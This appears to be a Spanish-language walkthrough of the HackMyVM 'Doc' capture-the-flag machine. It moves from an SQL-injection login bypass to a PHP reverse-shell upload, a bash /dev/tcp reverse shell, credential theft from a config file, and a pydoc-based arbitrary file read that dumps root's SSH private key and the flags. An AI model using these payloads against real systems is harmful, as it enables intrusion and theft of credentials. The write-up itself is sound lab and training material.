---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Doc HackMyVM (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-01 03:21 EDT
Nmap scan report for 192.168.5.33
Host is up (0.00077s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: nginx/1.18.0
|_http-title: Online Traffic Offense Management System - PHP
MAC Address: 08:00:27:8A:A8:D3 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.94 seconds
```

Veremos que solo tenemos un puerto `80` que aloja una pagina web, por lo que vamos a meternos dentro a ver que nos encontramos.

Nada mas entrar vemos que no carga muy bien, esto se debe a que requiere de un dominio, el cual si le damos al `login` directamente nos pide el dominio llamado `doc.hmv` vamos añadirlo a nuestro archivo `hosts`.

```shell
nnao /etc/hosts

#Dentro del nano
<IP>               doc.hmv
```

Lo guardamos y volvemos a cargar la pagina, pero esta vez desde el dominio.

```
URL = http://doc.hmv/
```

Ahora veremos que si nos carga de forma correcta todo, si nos vamos a `login` probaremos algunas credenciales por defecto, pero veremos que no nos deja, por lo que vamos a probar con un `SQLi` super basico a ver si funciona.

## Escalate user www-data

```
User: ' OR 1=1-- -
Pass: ' OR 1=1-- -
```

Veremos que si nos deja, por lo que vamos a explorar el panel en el que hemos entrado a ver que nos encontramos.

Despues de buscar un rato, si nos vamos al apartado de `My Account` veremos una foto de perfil en el que podemos subir una imagen, vamos a probar a subir un `.php` directamente y si lo bloqueara intentamos `Bypassearlo`.

> shell.php

```php
<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

Ahora vamos a darle al boton de subir imagen, seleccionamos el archivo `PHP` y veremos que funciona aparentemente, ahora nos pondremos antes a la escucha.

```shell
nc -lvnp <PORT>
```

Ahora volvemos a la pagina y le damos al boton llamado `update`, echo esto si volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.4] from (UNKNOWN) [192.168.5.33] 36468
whoami
www-data
```

Vemos que ha funcionado, por lo que vamos a sanitizar la shell.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user bella

Si leemos el archivo de configuracion de la pagina llamado `initialize.php` veremos lo siguiente:

```shell
cd ~/html/traffic_offense
cat initialize.php
```

Info:

```
<?php
$dev_data = array('id'=>'-1','firstname'=>'Developer','lastname'=>'','username'=>'dev_oretnom','password'=>'5da283a2d990e8d8512cf967df5bc0d0','last_login'=>'','date_updated'=>'','date_added'=>'');
if(!defined('base_url')) define('base_url','http://doc.hmv/');
if(!defined('base_app')) define('base_app', str_replace('\\','/',__DIR__).'/' );
if(!defined('dev_data')) define('dev_data',$dev_data);
if(!defined('DB_SERVER')) define('DB_SERVER',"localhost");
if(!defined('DB_USERNAME')) define('DB_USERNAME',"bella");
if(!defined('DB_PASSWORD')) define('DB_PASSWORD',"be114yTU");
if(!defined('DB_NAME')) define('DB_NAME',"doc");
?>
```

Veremos las credenciales del usuario llamado `bella` vamos a probarlas de la siguiente forma:

```shell
su bella
```

Metemos como contraseña `be114yTU` y vemos que somo dicho usuario, por lo que vamos a leer la `flag` del usuario.

> user.txt

```
HMVtakemydocs
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for bella on doc:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User bella may run the following commands on doc:
    (ALL : ALL) NOPASSWD: /usr/bin/doc
```

Vemos que podemos ejecutar el binario `doc` como el usuario `root`, por lo que vamos a investigar que hace dicho binario.

Si vemos los `strings` de dicho binario veremos esto.

```shell
strings /usr/bin/doc
```

Info:

```
/lib64/ld-linux-x86-64.so.2
system
__cxa_finalize
__libc_start_main
libc.so.6
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
[]A\A]A^A_
/usr/bin/pydoc3.9 -p 7890
;*3$"
.............................<RESTO DE STRINGS>....................................
```

Vemos que esta realizando un:

```shell
/usr/bin/pydoc3.9 -p 7890
```

Vamos a ver que puerto es ese de esta forma:

```shell
ss -tuln
```

Info:

```
Netid          State           Recv-Q          Send-Q                     Local Address:Port                     Peer Address:Port          Process          
udp            UNCONN          0               0                                0.0.0.0:68                            0.0.0.0:*                              
tcp            LISTEN          0               128                            127.0.0.1:21                            0.0.0.0:*                              
tcp            LISTEN          0               80                             127.0.0.1:3306                          0.0.0.0:*                              
tcp            LISTEN          0               511                              0.0.0.0:80                            0.0.0.0:*                              
tcp            LISTEN          0               511                                 [::]:80                               [::]:*
```

Vemos que no lo encontramos, por lo que deducimos que si nosotros ejecutamos dicho binario puede ser que se habra un servidor local desde la carpeta en la que me encuentre, vamos a probar lo siguiente.

```shell
cd /tmp
touch test.py
sudo /usr/bin/doc
```

Info:

```
Server ready at http://localhost:7890/
Server commands: [b]rowser, [q]uit
server>
```

Veremos que se nos despliega el servidor en dicho puerto, pero nos mete en un meterpreter, vamos a salirnos y volveremos a ejecutarlo pero antes recibiendo una segunda shell en otra terminal.

```shell
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1 &
```

Antes de ejecutarlo nos pondremos a la escucha.

```shell
nc -lvnp <PORT>
```

Ahora si lo ejecutamos veremos que obtuvimos una segunda shell, vamos a sanitizarla de nuevo.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Info:

```
bella@doc:/tmp$ whoami
bella
```

Ahora vamos en la primera terminal a ejecutar el `doc` de nuevo, de esta forma.

```shell
cd /tmp
sudo /usr/bin/doc
```

Ahora en la segunda terminal vamos a ejecutar el binario `socat` que ya esta en el sistema.

```shell
socat TCP-LISTEN:9999,fork TCP:127.0.0.1:7890
```

Ahora en la maquina `host` en el navegador tendremos que poner lo siguiente para acceder al puerto de la pagina web.

```
URL = http://<IP_VICTIM>:9999/
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-06-01 101715.png" alt=""><figcaption></figcaption></figure>

Veremos que esta funcionando, pilla los scripts que se crean en dichas rutas, por lo que vamos a crear un script `.py` de esta forma:

> root.py

```python
import os

def set_suid():
    try:
        os.chmod("/bin/bash", 0o4755)
        print("[+] SUID bit seteado en /bin/bash")
    except PermissionError:
        print("[-] Permiso denegado. Ejecuta este script como root.")
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    set_suid()
```

Ahora volvemos a ejecutar el `socat` y veremos que esta nuestro `script` llamado `root.py` de forma correcta, vamos a ejecutarlo pinchando en dicho script.

Pero no nos va a ejecutar nada, simplemente nos mostrara las funciones y todo lo que hace el script, pero si le damos a donde pone `/tmp/root.py` veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-06-01 102817.png" alt=""><figcaption></figcaption></figure>

Vemos que esta leyendo el archivo `.py` por lo que vamos a cambiar esa ruta y vamos a probar con la clave privada de `root`.

```
URL = http://<IP_VICTIM>:9999/getfile?key=/root/.ssh/id_rsa
```

Info:

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
uQ1x5zlzTqI5n3AAAACHJvb3RAZG9jAQI=
-----END OPENSSH PRIVATE KEY-----
```

Veremos que ha funcionado, pero no tenemos `SSH` por lo que vamos a probar a leer directamente la `flag` del usuario `root`.

```
URL = http://<IP_VICTIM>:9999/getfile?key=/root/root.txt
```

> root.txt

```
HMVfinallyroot
```
